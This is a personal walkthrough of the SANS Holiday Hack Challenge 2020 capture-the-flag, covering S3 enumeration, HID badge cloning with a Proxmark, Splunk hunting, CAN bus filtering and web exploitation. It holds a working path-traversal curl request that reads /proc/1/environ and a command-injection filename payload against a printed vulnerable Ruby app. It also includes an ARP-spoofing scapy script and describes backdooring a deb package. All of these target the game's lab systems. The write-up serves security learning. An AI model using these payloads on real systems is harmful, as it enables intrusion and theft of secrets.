# SANS HHQ 2020


# Objective #1 - Uncover Santa's Gift List


There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.

Using https://www.photopea.com/ as suggested by Jingle Redford, we can untwirl the text just enough to see that Josh is matched with "proxmark" on the list. Entering this will complete the first objective.


# Objective #2 - Investigate S3 Bucket


When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

Taking the motd as a clue, we can add "wrapper3000" to the wordlist used to search for the S3 buckets. Adding this will reveal a bucket available at http://s3.amazonaws.com/wrapper3000. We can download this using ./bucket_finder.rb --download wordlist.

This creates a directory called Wrapper3000 with a file called "package" within it.

The contents of this file look like base64, and decoding the base64 and pipeing the output to a file reveal a zip archive. Using unzip we see that the archive contains a mess of a compressed file. I now understand why this challenge mentions "unwrapping".

cat package | base64 -d > test
elf@b9f7029339fa:~/bucket_finder/wrapper3000$ file test 
test: Zip archive data, at least v1.0 to extract
elf@b9f7029339fa:~/bucket_finder/wrapper3000$ unzip test 
Archive:  test
 extracting: package.txt.Z.xz.xxd.tar.bz2  
elf@b9f7029339fa:~/bucket_finder/wrapper3000$ ls
package  package.txt.Z.xz.xxd.tar.bz2  test
elf@b9f7029339fa:~/bucket_finder/wrapper3000$

bzcat package.txt.Z.xz.xxd.tar.bz2 > test1
tar -xf test1

After these commands we have package.txt.Z.xz.xxd. I use file to view the type of file it is while decompressing it.

xxd -r package.txt.Z.xz.xxd test3.xz

unxz test3.xz

Running file on the test3 file we get
elf@b9f7029339fa:~/bucket_finder/wrapper3000$ file test3
test3: compress'd data 16 bits

mv test3 test3.Z

uncompress test3.Z

File test3 will now contain the string:
North Pole: The Frostiest Place on Earth


# Objective #3 - Point-of-Sale Password Recovery


Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?

Install asar using sudo npm install -g asar

Use 7zip to unpack the exe

Navigating into $PLUGINSDIR/resources directory will reveal the app.asar file.

elevate.exe is also here. Looks nteresting and might check out later.

Use asar extract app.asar santa-shop_source/

The password Santa is located in the main.js file.


# Objective #4 - Open the Santavator


Talk to Pepper Minstix in the entryway to get some hints about the Santavator.

Find various items around the castle and use them to direct the flow in the elevator maintenance panel to power it.


# Objective #5 - Open HID Lock


Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.

The proxmark device can be found in the wrappig room.

The command lf hid read can be used to read nearby cards


Reading Sparkle's card shows the following:

[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022

Noel Boetie's card shows the following:
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020

Bow Ninecandle's Card
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023

Holly Evergreen
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024

Angel Candysalt
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040

Shinny Upatree
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025


[magicdust] pm3 --> wiegand list
Name       Description
------------------------------------------------------------
H10301     HID H10301 26-bit             
Tecom27    Tecom 27-bit                  
2804W      2804 Wiegand                  
ATSW30     ATS Wiegand 30-bit            
ADT31      HID ADT 31-bit                
Kastle     Kastle 32-bit                 
D10202     HID D10202 33-bit             
H10306     HID H10306 34-bit             
N10002     HID N10002 34-bit             
C1k35s     HID Corporate 1000 35-bit standard layout
C15001     HID KeyScan 36-bit            
S12906     HID Simplex 36-bit            
Sie36      HID 36-bit Siemens            
H10320     HID H10320 36-bit BCD         
H10302     HID H10302 37-bit huge ID     
H10304     HID H10304 37-bit             
P10001     HID P10001 Honeywell 40-bit   
C1k48s     HID Corporate 1000 48-bit standard layout

Kastle should be used here?

lf hid sim -w H10301 --fc 113 --cn 6020

lf hid sim -r 2006e22f08


After some trial and error we eventually get access using Shinny Upatree's card with the command:
[magicdust] pm3 --> lf hid sim -r 2006e22f13
[=] Simulating HID tag using raw 2006e22f13
[=] Stopping simulation after 10 seconds.

A nice yyyeeAAAHHHH plays in the backgroun ;)


*****************************
When we open the door we enter a strange room. If we navigate the invisable maze we entually reach the end where....we become Santa! This gives us access to his office as we can use his fingerprint in the Santavator!!!
*****************************



# Objective #6 - Splunk Challenge


Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?

Santa SOC

Training Questions - 

1.	How many distinct MITRE ATT&CK techniques did Alice emulate? 
Run  "| tstats count where index=* by index"
Count how many unique techniques are in the returned list.

Answer is 13

2.	What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)

Look for 1059.003 in the list and provide the names of the two tems there.

Answer is t1059.003-main t1059.003-win

3.	One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?

Alice the elf points us to the github repo for Atomic Red Team. We can search this repo for the strings mentioned above. Either MachineGuid or "system information discovery" will work.

https://github.com/redcanaryco/atomic-red-team/tree/master/atomics

https://github.com/redcanaryco/atomic-red-team/search?q=system+information+discovery

We can see from the results of the search that T1082 shows up in both cases. We can also see this in the list of techniques listewn when running the search "| tstats count where index=* by index"

The exact function we need to look at is: https://github.com/redcanaryco/atomic-red-team/blob/7ebf7536b886637d85388c93f34401d493cf4087/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery

Answer is HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography

4.	According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)

Searching for index=attack OSTAP will show a number of tests.

The first was at 2020-11-30T17:44:15Z

Answer is 2020-11-30T17:44:15Z

5.	One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?

frgnca's github repo has this:
https://github.com/frgnca/AudioDeviceCmdlets

Searching the Atomic Red Team's repo we can find that technique T1123 uses this 
https://github.com/redcanaryco/atomic-red-team/search?q=AudioDeviceCmdlets

We can search for index=attack T1123

After ALOT of messing around with this (still not sure how Splunk search works....) eventually come to this search string that works. The WindowsAudioDevice part comes from the Atomic red team technique in the github repo above. The string is used when executing the powershell command

index=T1123* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 WindowsAudioDevice

Answer is 3648


6.	Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?

This was painful.

I ended up search with this command 

index=* .bat

and on the finding any .bat files belonging to techniques which weren't the technique that called it. I looked at these files on github and eventually found one that was multiline and worked!

https://github.com/redcanaryco/atomic-red-team/blob/8eb52117b748d378325f7719554a896e37bccec7/atomics/T1074.001/src/Discovery.bat

Answer is quser

7.	According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?

Using the search suggested by Alice Bluebird:
 
index=* sourcetype=bro*

We can look through the list to find an entry with a source of:
/opt/zeek/logs/current/x509.log

Looking at this will show some details of the x509 cert, including the serial number! 

Answer is 55FCEEBB21270D9249E86F4B9DC7AA60

LAST

What is the name of the adversary group that Santa feared would attack KringleCon?

Alice gives us the following hint:
This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is:
7FXjP1lyfKbyDK/MChyf36h7
It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one!

Santa's favorite phrase is on the slides from the Splunk talk "Stay Frosty"

RFC 7465 -> RC4

So the base64 encoded data Alice gave us is encrypted with RC4

Using this script we can decrypt the message:
#!/usr/bin/python2

#Taken from
#https://stackoverflow.com/questions/29607753/how-to-decrypt-a-file-that-encrypted-with-rc4-using-python

import base64

data = base64.b64decode("7FXjP1lyfKbyDK/MChyf36h7")
key = "Stay Frosty"

S = range(256)
j = 0
out = []

#KSA Phase
for i in range(256):
    j = (j + S[i] + ord( key[i % len(key)] )) % 256
    S[i] , S[j] = S[j] , S[i]

#PRGA Phase
i = j = 0
for char in data:
    i = ( i + 1 ) % 256
    j = ( j + S[i] ) % 256
    S[i] , S[j] = S[j] , S[i]
    out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

print(out)

The result will be "The Lollipop Guild"




# Objective #7 - Solve the Sleigh's CAN-D-BUS Problem


Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.

Ok, so here we need to filter out messages from the CAN-D-Bus log. We're supposed to look for ones whihc may be part of some malicious component or software on the device, so really we should be looking for messages that shouldn't be there.

In the challenge we're presented with a log and some controls to manipulate the sleigh components. We already know the operation for one component, the lock and unlock mechanism, so we can start with this.

ENGINE START/STOP 

START LOG -> 02A#00FF00
STOP LOG - >02A#0000FF

Not seeing anything strange here

LOCK/UNLOCK
We know this component starts with 19B 

When nothing else is being operated, we can filter out logs with IDs 244, 188, 080, and 019.

We can then LOCK and UNLOCK the sleigh

The LOCK signal is 19B#000000000000
The UNLOCK signal is 19B#00000F000000

Another signal, 19B#0000000F2057, is shown. This shouldn't be here we lets add this to the list of messages to block.

ENGINE IDLE

These should be the messages starting with 244. Removing this ID from the filter will show the messages. 

When the engine is off we should be a value of 244#000000000000 shown for messages with this ID. I'm guessing that this is essestially a rev counter, so when the engine is off we should see 0. 

Nothing suspicious shows up when the engine is off. We we turn it on we see messages with various values.

Nothing noteworthy seems to be happening here when the sleigh is idling.

We can use the accelerator to increase the revs. Again, nothing immediatley suspcious is showing up here. The values in the logs appear to be consistent with the revs. There aren't any starnge values appearing.

BRAKE

Filting out anything that contains 244 we can hide the rev counter logs.

Playing with the brakes shows that the brake component has a log ID of 080.

Removing this from the filter will reveal these messages (The messages can be seen when the brakes are applied if the filter is EQUAL to 080#000000000000. Applying the breakes provides a value above this and therefore can be seen.)

Wehn no brakes are applied there doesn;t appear to be anything suspicious showing up. The value is consistenly 080#000000000000 as expected.

If we provide a brake value of 10, we can see the expected log of 080#00000A (A being the Hex value of 10), but we can also see the follwoing log messages; 080#FFFFFA, 080#FFFFF3, , 080#FFFFF0, 080#FFFFF8, 080#FFFFFD. There messages may be evil.


Steering

The steering logs have an ID of 019. We can see this in the logs when applying steering.

We can test this in a similar way to the brakes. We apply a value that we should know and check for values that don't match.

Wehn steering is at 0 there are no unexpected messages that show.

We can see that when steering is applied it appears to jump between the value and the previous value, so a steering value of 4 would also show logs for a value of 3. They swap intermitenly.

Nothing suspicious shows up whenh applying a positive steering value (going to the right).

Nothing suspicious can be seen when applying a negative steering value either.

BAD LOGS

Applying the following filters will "Defrost" the sleigh!

19B EQUALS 0000000F2057
080 CONTAINS FFFFFA
080 CONTAINS FFFFF3
080 CONTAINS FFFFF8
080 CONTAINS FFFFFD
080 CONTAINS FFFFF0



# Objective #8 - Broken Tag Generator


Broken Tag Generator

Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

Going to the wrapping room mand clicking on the Tag Generator will bring us to https://tag-generator.kringlecastle.com/

Noel suggests that there may be something going wrong becuase of "weird files being uploaded".

This WebApp lets us generate tags, or small cards. We can select from some templates, add in clipart, add text, etc. We can also upload our own image.

We can get some interesting information by looking at the HTTP traffic in the browser:

-	Images are stored in https://tag-generator.kringlecastle.com/images/
	Navigating to that directory provides us with the following error: 
	"Something went wrong!
	 Error in /app/lib/app.rb: Route not found"
	 This tells us that we may be dealing with a ruby app. 
	 Navigating to /app, /app/lib/, and /app/lib/app.rb gives us the same error (No route found).

-	If we upload an image it will get a unique ID. The image can be accessed directly using this
    ID with a URL like https://tag-generator.kringlecastle.com/image?id=40ddcdc5-4b43-4827-9f53-0956dfb63ea9.png
	
	There may be an arbitrary file read issue here but initial tests didn't show this was possible.

- 	app.js contains the logic for the tag generator client. Anything we do to manipulate an
    image in the tag generator appears to be done client-side, so everything should be done in this file.

	Looking at this file shows us some more routes on the site; /save and /share.
	
	
From looking at the site it looks like we might be able to upload and execute a file. As the site is using Ruby in the backed we should go with a Ruby file.

If we create a simple Ruby file, test.rb, and try to upload it we get the following error:
ERROR
Something went wrong!
Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20210113-1-1onon5b.txt

If we edit to file to test.png and try to upload it we get:
ERROR
Something went wrong!
Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20210113-1-1hkljf3.txt



dylan@DESKTOP:~$ curl -H "Content-Type: text" https://tag-generator.kringlecastle.com/image?id=
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>


https://tag-generator.kringlecastle.com/upload




WINRAR

curl -H "Content-Type: text" https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb

encoding: ASCII-8BIT

TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

Don't put the uploads in the application folder
Dir.chdir TMP_FOLDER

require 'rubygems'

require 'json'
require 'sinatra'
require 'sinatra/base'
require 'singlogger'
require 'securerandom'

require 'zip'
require 'sinatra/cookies'
require 'cgi'

require 'digest/sha1'

LOGGER = ::SingLogger.instance()

MAX_SIZE = 1024**2*5 # 5mb

#Manually escaping is annoying, but Sinatra is lightweight and doesn't have
#stuff like this built in :(
def h(html)
  CGI.escapeHTML html
end

def handle_zip(filename)
  LOGGER.debug("Processing #{ filename } as a zip")
  out_files = []

  Zip::File.open(filename) do |zip_file|
    #Handle entries one by one
    zip_file.each do |entry|
      LOGGER.debug("Extracting #{entry.name}")

      if entry.size > MAX_SIZE
        raise 'File too large when extracted'
      end

      if entry.name().end_with?('zip')
        raise 'Nested zip files are not supported!'
      end

      #I wonder what this will do? --Jack
      #if entry.name !~ /^[a-zA-Z0-9._-]+$/
      #raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
      #end

      #We want to extract into TMP_FOLDER
      out_file = "#{ TMP_FOLDER }/#{ entry.name }"

      #Extract to file or directory based on name in the archive
      entry.extract(out_file) {
        #If the file exists, simply overwrite
        true
      }

      #Process it
      out_files << process_file(out_file)
    end
  end

  return out_files
end

def handle_image(filename)
  out_filename = "#{ SecureRandom.uuid }#{File.extname(filename).downcase}"
  out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

  #Resize and compress in the background
  Thread.new do
    if !system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")
      LOGGER.error("Something went wrong with file conversion: #{ filename }")
    else
      LOGGER.debug("File successfully converted: #{ filename }")
    end
  end

  #Return just the filename - we can figure that out later
  return out_filename
end

def process_file(filename)
  out_files = []

  if filename.downcase.end_with?('zip')
    #Append the list returned by handle_zip
    out_files += handle_zip(filename)
  elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png')
    #Append the name returned by handle_image
    out_files << handle_image(filename)
  else
    raise "Unsupported file type: #{ filename }"
  end

  return out_files
end

def process_files(files)
  return files.map { |f| process_file(f) }.flatten()
end

module TagGenerator
  class Server < Sinatra::Base
    helpers Sinatra::Cookies

    def initialize(*args)
      super(*args)
    end

    configure do
      if(defined?(PARAMS))
        set :port, PARAMS[:port]
        set :bind, PARAMS[:host]
      end

      set :raise_errors, false
      set :show_exceptions, false
    end

    error do
      return 501, erb(:error, :locals => { message: "Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }" })
    end

    not_found do
      return 404, erb(:error, :locals => { message: "Error in #{ __FILE__ }: Route not found" })
    end

    get '/' do
      erb(:index)
    end

    post '/upload' do
      images = []
      images += process_files(params['my_file'].map { |p| p['tempfile'].path })
      images.sort!()
      images.uniq!()

      content_type :json
      images.to_json
    end

    get '/clear' do
      cookies.delete(:images)

      redirect '/'
    end

    get '/image' do
      if !params['id']
        raise 'ID is missing!'
      end

      #Validation is boring! --Jack
      #if params['id'] !~ /^[a-zA-Z0-9._-]+$/
      #return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen'
      #end

      content_type 'image/jpeg'

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }"

      if File.exists?(filename)
        return File.read(filename)
      else
        return 404, "Image not found!"
      end
    end

    get '/share' do
      if !params['id']
        raise 'ID is missing!'
      end

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }.png"

      if File.exists?(filename)
        erb(:share, :locals => { id: params['id'] })
      else
        return 404, "Image not found!"
      end
    end

    post '/save' do
      payload = params
      payload = JSON.parse(request.body.read)

      data_url = payload['dataURL']
      png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1])

      out_hash = Digest::SHA1.hexdigest png
      out_filename = "#{ out_hash }.png"
      out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

      LOGGER.debug("output: #{out_path}")
      File.open(out_path, 'wb') { |f| f.write(png) }
      { id: out_hash }.to_json
    end
  end
end


The handle_zip function here looks interesting. The filenames within the zip file aren't being validated. Moreover, the files extracted from the file are used to replace any existing files. Could we overwrite the app.rb file with our own file?

ALSO

system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")

Could we inject a command here?


Coming back to this on the 27/06/2021. Have decided to use https://n00.be/HolidayHackChallenge2020/objectives/o8/ as support to complete these challenges. I need to get back into the game and don't want to burn myself out in the process. According to the answer in that link there are two solutions, Path traversal and getting a reverse shell. I was trying to get a reverse shell above by getting my own code/file on the server. Either that or upload code that would print the environmental variables. I used path traversal to get the file displayed above in the first place. I'm going to look at both of the solutions.

1) Path Traversal 
I used this to get the code for the app.rb file. Everything in Linux is a file and it would have been possible to retrieve the file that holds the environmental variables (facepalm lol). In hindsight this should have been obvious, but I've never actually retrieve the environmental variables from a file so I didn't even think of this solution. 
The variables can be retried from /etc/environment. The solution in the link gets the variables from /proc/1/environ. It seems that each process in the system would have it's own copy of the environmental variables? Running cat /proc/1/environ on a local Kali install presents a Permission Denied message. This may be down to the process that's running. The SANS HHQ is using containers so the same restrictions wouldn't exist there as a system process wouldn't be taking PID 1. To test this I started a netcat listener on Kali and got the PID of that process. Running cat /proc/$NC_PID$/environ returned the env variables. Awesome!
If we had a case where a server was running the web server natively (not in a container) and PID 1 wouldn't work it would be fairly trivial to just enumerate through PIDs until we got to one that worked. 

Winrar. So we can exploit the same path traversal vulnerability we did before but this time try to read the file that contains the env variables. We did need to add a parameter to tell curl to output to the terminal regardless of the data format. This flag is output and is used lime "--output -". 

The complete solution is 
curl -H "Content-Type: text" https://tag-generator.kringlecastle.com/image?id=../../../../proc/1/environ --output -

The above command outputs:

PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app

This is what we were looking for: GREETZ=JackFrostWasHere

2) Reverse Shell/Command Injection

I was right to be looking at this line before:

system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")

The unchecked filename variable here can indeed be used to inject commands. According to the answer naming a file "myfile';echo $GREETZ>the_GREETZ_tag.txt;ls '.png" would exploit this. This file would be named as such and then added to a zip file before being uploaded. After the command is executed the variable would be accessible in the /tmp directory.

A reverse shell could have been obtained the same way with a different command injected. Would have to open ports on the home router and set a lister up for this of course.




# Objective #9 - ARP Shenanigans


Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who reused herself from the vote described on the document?

Time to head to the roof. I want to do this without looking at the solution becuase this should be my bread and butter. 

I've only not realized that there is a fast travel option in the badge!

Entering the terminal we get the following text:

"Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
Help the North Pole by getting command line access back to this host.

Read the HELP.md file for information to help you in this endeavor.

Note: The terminal lifetime expires after 30 or more minutes so be 
sure to copy off any essential work you have done as you go."

HELP.md shows the following:

"# How To Resize and Switch Terminal Panes:
You can use the key combinations ( Ctrl+B ↑ or ↓ ) to resize the terminals.
You can use the key combinations ( Ctrl+B o ) to switch terminal panes.
See tmuxcheatsheet.com for more details

To Add An Additional Terminal Pane:
`/usr/bin/tmux split-window -hb`

To exit a terminal pane simply type:
`exit`

To Launch a webserver to serve-up files/folder in a local directory:
```
cd /my/directory/with/files
python3 -m http.server 80
```

A Sample ARP pcap can be viewed at:
https://www.cloudshark.org/captures/d97c5b81b057

A Sample DNS pcap can be viewed at:
https://www.cloudshark.org/captures/0320b9b57d35

If Reading arp.pcap with tcpdump or tshark be sure to disable name
resolution or it will stall when reading:
````
tshark -nnr arp.pcap
tcpdump -nnr arp.pcap
````

We have 3 terminal windows infront of us. Using ifconfig we can see what they all have the same IP and seem to actually be the same host. 

In the current directory we have the following:

guest@aa06b5ba6cc5:~$ ls
HELP.md  debs  motd  pcaps  scripts
guest@aa06b5ba6cc5:~$ ls debs
gedit-common_3.36.1-1_all.deb                      nano_4.8-1ubuntu1_amd64.deb                    nmap_7.80+dfsg1-2build1_amd64.deb  unzip_6.0-25ubuntu1_amd64.deb
golang-github-huandu-xstrings-dev_1.2.1-1_all.deb  netcat-traditional_1.10-41.1ubuntu1_amd64.deb  socat_1.7.3.3-2_amd64.deb
guest@aa06b5ba6cc5:~$ ls pcaps/
arp.pcap  dns.pcap
guest@aa06b5ba6cc5:~$ ls scripts/
arp_resp.py  dns_resp.py
guest@aa06b5ba6cc5:~$

The scripts here are interesting. Looks like some tools to help us.

arp_resp.py

~~~
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

#Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
#Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    #if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst="SOMEMACHERE", type=0x806, src="SOMEMACHERE")

        arp_response = ARP(pdst="SOMEMACHERE")
        arp_response.op = 99999
        arp_response.plen = 99999
        arp_response.hwlen = 99999
        arp_response.ptype = 99999
        arp_response.hwtype = 99999

        arp_response.hwsrc = "SOMEVALUEHERE"
        arp_response.psrc = "SOMEVALUEHERE"
        arp_response.hwdst = "SOMEVALUEHERE"
        arp_response.pdst = "SOMEVALUEHERE"

        response = ether_resp/arp_response

        sendp(response, iface="eth0")

def main():
    #We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    #sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()
~~~

dns_resp.py
~~~
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

#Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
#Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
#destination ip we arp spoofed
ipaddr_we_arp_spoofed = "10.6.1.10"

def handle_dns_request(packet):
    #Need to change mac addresses, Ip Addresses, and ports below.
    #We also need
    eth = Ether(src="00:00:00:00:00:00", dst="00:00:00:00:00:00")   # need to replace mac addresses
    ip  = IP(dst="0.0.0.0", src="0.0.0.0")                          # need to replace IP addresses
    udp = UDP(dport=99999, sport=99999)                             # need to replace ports
    dns = DNS(
        #MISSING DNS RESPONSE LAYER VALUES 
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    #sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    main()
~~~

Ok, so using tcpdump we can see some ARP requests showing up:
guest@aa06b5ba6cc5:~/debs$ tcpdump
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
22:11:02.539520 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
22:11:03.571506 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28
22:11:04.603551 ARP, Request who-has winsrvdc2019.guestnet0.kringlecastle.com tell arp_requester.guestnet0.kringlecastle.com, length 28

...and they just keep on coming.

So by now I'm guessing that we have to masquerade as the C2 machine for Jacks Malware. I'm guessing that we'll need to...

1 - Edit and run the arp_resp.py script to respond to the ARP request with our details, poisoning the other devices ARP cache and making it believe we are the C2 machine. At this point we will probably start seeing other types of traffic.
2- Edit the dns_resp.py script to respond to DNS requests to point the requesting host to a local webserver we run. I'm guessing we'll be running the web server in the /dist directory so that the malware can access the deb files in there. 
3 - ?


Now the goal here is to "get command line access back" to 10.6.6.35. I'm guessing that this will be the host we will be communicating with. The flag we're looking for is in /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Probably on that host. 

So if the steps above are correct then maybe for step 3 we need to backdoor one of the deb files that the host will presumably download.

We can confirm with the ping tool that arp_requester.guestnet0.kringlecastle.com is in fact 10.6.6.35


winsrvdc2019.guestnet0.kringlecastle.com is actually at 10.6.6.53

Right, lets set this up.

Our MAC is 02:42:0a:06:00:02 (could also call get_if_hwaddr() in the script)

Our IP is 10.6.0.2

Target MAC is 4c:24:57:ab:ed:84

Target IP is 10.6.6.35

The modified arp_resp.py file is as follows:

```
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

#Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
#Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    #if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst="4c:24:57:ab:ed:84", type=0x806, src="02:42:0a:06:00:02")

        arp_response = ARP(pdst="4c:24:57:ab:ed:84")
        arp_response.op = 2
        #arp_response.plen = 99999
        #arp_response.hwlen = 99999
        #arp_response.ptype = 99999
        #arp_response.hwtype = 99999

        arp_response.hwsrc = "02:42:0a:06:00:02"
        arp_response.psrc = "10.6.6.53"
        arp_response.hwdst = "4c:24:57:ab:ed:84"
        arp_response.pdst = "10.6.6.35"

        response = ether_resp/arp_response

        sendp(response, iface="eth0")

def main():
    #We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    #sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()
```

After running be above we see this packet:
22:54:01.484115 IP arp_requester.guestnet0.kringlecastle.com.54299 > winsrvdc2019.guestnet0.kringlecastle.com.domain: 0+ A? ftp.osuosl.org. (32)


# Objective #10 - Defeat Fingerprint Sensor


Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.



# Objective #11 - Naughty/Nice List with Blockchain Investigation Part 1


Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)





# Objective #11 - Naughty/Nice List with Blockchain Investigation Part 1


The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?


# Side-Quests
## Elf JavaScript Game
```
Level 1:
	elf.moveLeft(10)
	elf.moveUp(10)
Level 2:
	var s = elf.get_lever(0)
	elf.moveLeft(6)
	elf.pull_lever(s + 2)
	elf.moveLeft(4)
	elf.moveUp(10)
Level 3:
	elf.moveTo(lollipop[0])
	elf.moveTo(lollipop[1])
	elf.moveTo(lollipop[2])
	elf.moveUp(1)
Level 4:
	elf.moveLeft(1)
	for (var i = 0; i < 3; i++) {
	  elf.moveUp(40)
	  elf.moveLeft(40)
	  elf.moveDown(40)
	  elf.moveLeft(3)
	}
Level 5: 
	var a = []
	var q = elf.ask_munch(0)
	for (var i = 0; i < q.length; i++) {
	  if (typeof q[i] === 'number') {
	    a.push(q[i])
	  }
	}
	elf.moveTo(lollipop[0])
	elf.tell_munch(a)
	elf.moveUp(2)
Level 6:
	for (var i = 0; i < 4; i++) {
	  elf.moveTo(lollipop[i])
	}
	elf.moveLeft(8)
	elf.moveUp(2)
	var j = elf.ask_munch(0)
	for (o in j) {
	  if (j[o] == "lollipop") {
